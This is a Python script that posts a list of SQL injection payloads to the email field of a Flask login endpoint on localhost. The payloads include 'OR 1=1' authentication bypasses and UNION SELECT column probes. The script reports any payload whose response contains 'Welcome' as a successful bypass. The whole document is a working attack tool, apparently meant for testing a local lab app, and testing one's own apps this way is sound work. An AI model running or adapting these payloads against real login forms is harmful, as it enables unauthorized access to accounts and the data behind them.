import requests

# Set the target URL where the Flask app is running
TARGET_URL = "http://127.0.0.1:5000/login"

# List of potential SQL injection payloads to test
sql_injections = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' OR '1'='1'/*",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, 'any' --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' OR '1'='1' AND email IS NOT NULL --",
    # second try:
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL, NULL --",
]

def test_sql_injections():
    # Headers for the POST request
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Iterate over each SQL injection payload
    for payload in sql_injections:
        data = {
            "email": payload,
            "password": "any_password"  # Password field can be anything since injection is only in the email field
        }
        
        # Send POST request with the payload
        response = requests.post(TARGET_URL, headers=headers, data=data)
        
        # Check if the response indicates a successful login or any unusual behavior
        if "Welcome" in response.text:
            print(f"[+] Vulnerable to SQL Injection: '{payload}'")
            print(f"Response: {response.text[:100]}...")  # Print a snippet of the response
        else:
            print(f"[-] Not vulnerable with payload: '{payload}'")

if __name__ == "__main__":
    test_sql_injections()
